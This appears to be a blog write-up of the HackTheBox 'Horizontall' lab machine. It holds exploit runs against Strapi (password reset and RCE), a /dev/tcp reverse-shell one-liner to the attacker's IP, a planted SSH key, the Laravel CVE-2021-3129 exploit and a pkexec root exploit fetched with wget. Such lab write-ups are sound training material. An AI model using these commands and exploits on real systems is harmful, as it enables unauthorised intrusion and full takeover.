---
date: 2022-01-08 23:48:05
layout: post
title: Horizontall
subtitle: Horizontall from hackthebox Writeup.
description: >-
  in this blog i've explained how to root Previse from HackTheBox
image: https://www.hackthebox.com/storage/avatars/e4ec7d8504fdb58b5e6b7ddc82aafc77.png
optimized_image: https://www.hackthebox.com/storage/avatars/e4ec7d8504fdb58b5e6b7ddc82aafc77.png
category: hackthebox
tags:
  - Hackthebox
  - CVE
  - Port Forwarding
  - CMS
author: Mahmoud S. Atia
paginate: true
---

# Summary
Horizonatll was easy machine in hackthebox.First there is a strapi CMS vulnerable of cve. Exploit the CVE and get shell using command injection vulnerability. Discover what is running on localhost and do Port Forwarding to exploit another CVE in laravel using blind rce to get root.
In Beyond Root i will exploit CVE in Kernal.

![](https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/hackthebox/Horizontall/9.png)

---

# nmap 
using nmap to discover open ports

```bash
┌──(root💀H3X0S3)-[/home/h3x0s3/Desktop/Labs/HTB]
└─# nmap -sS -sC -sV -A horizontall.htb                       
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-029 12:14 EST
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up (0.74s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Aggressive OS guesses: Linux 5.0 - 5.3 (95%), Linux 4.15 - 5.6 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), Linux 5.3 - 5.4 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

based on nmap resul we have 2 open ports
> 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

> 80/tcp open  http    nginx 1.14.0 (Ubuntu)

add horizontall.htb to /etc/hosts to the ip of machine

lets discover site 

![](https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/hackthebox/Horizontall/1.png)

- there is noting impartant
- lets view the source code of the page ( CTRL + U )

![](https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/hackthebox/Horizontall/2.png)

open app.c68eb462.js to see the code

![](https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/hackthebox/Horizontall/3.png)

there is a url **http://api-prod.horizontall.htb/** 

with that 

**/reviews **  

endpoint so there is subdomain called 

> http://api-prod.horizontall.htb/

- check the subdomain

![](https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/hackthebox/Horizontall/4.png)

using wappalyzer addon it is Strapi CMS, so we need to fine the version of CMS to check if there any CVE
- after some directory brute force we get CMS verion

![](https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/hackthebox/Horizontall/5.png)

# Get Shell using CVE

go to exploitdb to seacrh for any cve we got

**https://www.exploit-db.com/exploits/50239**

- Remote Code Execution (RCE) (Unauthenticated) 

``` bash 
┌──(root💀H3X0S3)-[/home/…/Desktop/Labs/HTB/Horizontall]
└─# python3 exploit.py http://api-prod.horizontall.htb/
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjQ0MDczMTUwLCJleHAiOjE2NDY2NjUxNTB9.eRyNqdAGMghLUXHXFzu9JAEOtZyKalzW6580CgvvYvA


$> 
```
we get a shell but it's blind RCE to try to get a nc shell

```bash 

$> bash -c 'bash -i >& /dev/tcp/10.10.16.14/1337 0>&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
<html>
<head><title>504 Gateway Time-out</title></head>                            
<body bgcolor="white">                                                      
<center><h1>504 Gateway Time-out</h1></center>                              
<hr><center>nginx/1.14.0 (Ubuntu)</center>                                  
</body>                                                                     
</html>                                                                     
                                                                            
$> 
```
![](https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/hackthebox/Horizontall/6.png)

we got shell and we can read user flag

```bash

strapi@horizontall:/home/developer$ ll
ll
total 108
drwxr-xr-x  8 developer developer  4096 Aug  2  2021 ./
drwxr-xr-x  3 root      root       4096 May 25  2021 ../
lrwxrwxrwx  1 root      root          9 Aug  2  2021 .bash_history -> /dev/null
-rw-r-----  1 developer developer   242 Jun  1  2021 .bash_logout
-rw-r-----  1 developer developer  3810 Jun  1  2021 .bashrc
drwx------  3 developer developer  4096 May 26  2021 .cache/
-rw-rw----  1 developer developer 58460 May 26  2021 composer-setup.php
drwx------  5 developer developer  4096 Jun  1  2021 .config/
drwx------  3 developer developer  4096 May 25  2021 .gnupg/
drwxrwx---  3 developer developer  4096 May 25  2021 .local/
drwx------ 12 developer developer  4096 May 26  2021 myproject/
-rw-r-----  1 developer developer   807 Apr  4  2018 .profile
drwxrwx---  2 developer developer  4096 Jun  4  2021 .ssh/
-r--r--r--  1 developer developer    33 Feb  5 09:40 user.txt
lrwxrwxrwx  1 root      root          9 Aug  2  2021 .viminfo -> /dev/null
strapi@horizontall:/home/developer$ cat user.txt
cat user.txt 
2dd82###########################
strapi@horizontall:/home/developer$ 
```
# Shell as Root

## Enumeration

after searching for intersting file i get 

```bash

strapi@horizontall:~/myapi/config/environments$ cd development/
cd development/
strapi@horizontall:~/myapi/config/environments/development$ ll
ll
total 32
drwxr-xr-x 2 strapi strapi 4096 Jul 29  2021 ./
drwxr-xr-x 5 strapi strapi 4096 May 26  2021 ../
-rw-r--r-- 1 strapi strapi  135 May 26  2021 custom.json
-rw-rw-r-- 1 strapi strapi  351 May 26  2021 database.json
-rw-r--r-- 1 strapi strapi  439 May 26  2021 request.json
-rw-r--r-- 1 strapi strapi  164 May 26  2021 response.json
-rw-r--r-- 1 strapi strapi  529 May 26  2021 security.json
-rw-r--r-- 1 strapi strapi  159 May 26  2021 server.json
strapi@horizontall:~/myapi/config/environments/development$ cat database.json
cat database.json
{
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
      },
      "options": {}
    }
  }
}

```

so try to see netstat 

``` bash
strapi@horizontall:/home/developer$ netstat -tnlp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      1595/node /usr/bin/ 
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -
```

![](https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/hackthebox/Horizontall/7.png)


there are many port
- port 22 for ssh
- port 1337 for Nodjs API
- port 3306 for mysql which we discovered credentials

prot 8000 for for what !!!!

- lest connect via ssh and do port forwarding

## ssh & port forwarding

```bash
strapi@horizontall:~$ mkdir .ssh
strapi@horizontall:~$ cd .ssh/
strapi@horizontall:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuyT############################################################= root@H3X0S3" >> authorized_keys 
```

from our terminal

```bash

┌──(root💀H3X0S3)-[/home/…/Desktop/Labs/HTB/Horizontall]
└─# ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@horizontall.htb
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Feb  5 15:35:26 UTC 2022

  System load:  0.08              Processes:           196
  Usage of /:   82.5% of 4.85GB   Users logged in:     0
  Memory usage: 47%               IP address for eth0: 10.10.11.105
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
$ 
```

open web browser

![](https://raw.githubusercontent.com/H3X0S3/h3x0s3.github.io/main/assets/img/hackthebox/Horizontall/8.png)


we have the version, go to search for any CVE, we find debug mode: Remote code execution (CVE-2021-3129)

**https://github.com/nth347/CVE-2021-3129_exploit**

```bash
┌──(root💀H3X0S3)-[/home/…/Desktop/Labs/HTB/Horizontall]
└─# python3 exploit2.py http://127.0.0.1:8000 Monolog/RCE1 "id"                
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```
read root flag

```bash
┌──(root💀H3X0S3)-[/home/…/Desktop/Labs/HTB/Horizontall]
└─# python3 exploit2.py http://127.0.0.1:8000 Monolog/RCE1 "cat /root/root.txt"
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

78392###########################

[i] Trying to clear logs
[+] Logs cleared
```


# Beyond Root

## CVE-2021-4034

A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies

``` bash
cd H3X0S3/                                                                                                                                 
strapi@horizontall:~/H3X0S3$ wget http://10.10.16.14:9000/Makefile                                                                         
wget http://10.10.16.14:9000/Makefile                                                                                                      
--2022-02-05 15:46:15--  http://10.10.16.14:9000/Makefile                                                                                  
Connecting to 10.10.16.14:9000... connected.                                                                                               
HTTP request sent, awaiting response... 200 OK                                                                                             
Length: 148 [application/octet-stream]                                                                                                     
Saving to: ‘Makefile’                                                                                                                      
                                                                                                                                           
     0K                                                       100% 9.00M=0s                                                                
                                                                                                                                           
2022-02-05 15:46:17 (9.00 MB/s) - ‘Makefile’ saved [148/148]                                                                               
                                                                                                                                           
strapi@horizontall:~/H3X0S3$ wget http://10.10.16.14:9000/exploit.c                                                                        
wget http://10.10.16.14:9000/exploit.c                                                                                                     
--2022-02-05 15:46:20--  http://10.10.16.14:9000/exploit.c                                                                                 
Connecting to 10.10.16.14:9000... connected.                                                                                               
HTTP request sent, awaiting response... 200 OK                                                                                             
Length: 614 [text/x-csrc]                                                                                                                  
Saving to: ‘exploit.c’

     0K                                                       100% 40.5M=0s

2022-02-05 15:46:22 (40.5 MB/s) - ‘exploit.c’ saved [614/614]

strapi@horizontall:~/H3X0S3$ wget http://10.10.16.14:9000/evil-so.c
wget http://10.10.16.14:9000/evil-so.c
--2022-02-05 15:46:45--  http://10.10.16.14:9000/evil-so.c
Connecting to 10.10.16.14:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 183 [text/x-csrc]
Saving to: ‘evil-so.c’

     0K                                                       100% 9.40M=0s

2022-02-05 15:46:47 (9.40 MB/s) - ‘evil-so.c’ saved [183/183]

strapi@horizontall:~/H3X0S3$ ll
ll
total 20
drwxrwxr-x  2 strapi strapi 4096 Feb  5 15:46 ./
drwxr-xr-x 13 strapi strapi 4096 Feb  5 15:44 ../
-rw-rw-r--  1 strapi strapi  183 Jan 26 01:01 evil-so.c
-rw-rw-r--  1 strapi strapi  614 Jan 26 01:01 exploit.c
-rw-rw-r--  1 strapi strapi  148 Jan 26 01:01 Makefile
strapi@horizontall:~/H3X0S3$ make
make
gcc -shared -o evil.so -fPIC evil-so.c
evil-so.c: In function ‘gconv_init’:
evil-so.c:10:5: warning: implicit declaration of function ‘setgroups’; did you mean ‘getgroups’? [-Wimplicit-function-declaration]
     setgroups(0);
     ^~~~~~~~~
     getgroups
evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull]
     execve("/bin/sh", NULL, NULL);
     ^~~~~~
gcc exploit.c -o exploit
exploit.c: In function ‘main’:
exploit.c:25:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
     execve(BIN, argv, envp);
     ^~~~~~
strapi@horizontall:~/H3X0S3$ ./exploit
./exploit
id
uid=0(root) gid=0(root) groups=0(root)


id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
78392###########################
```

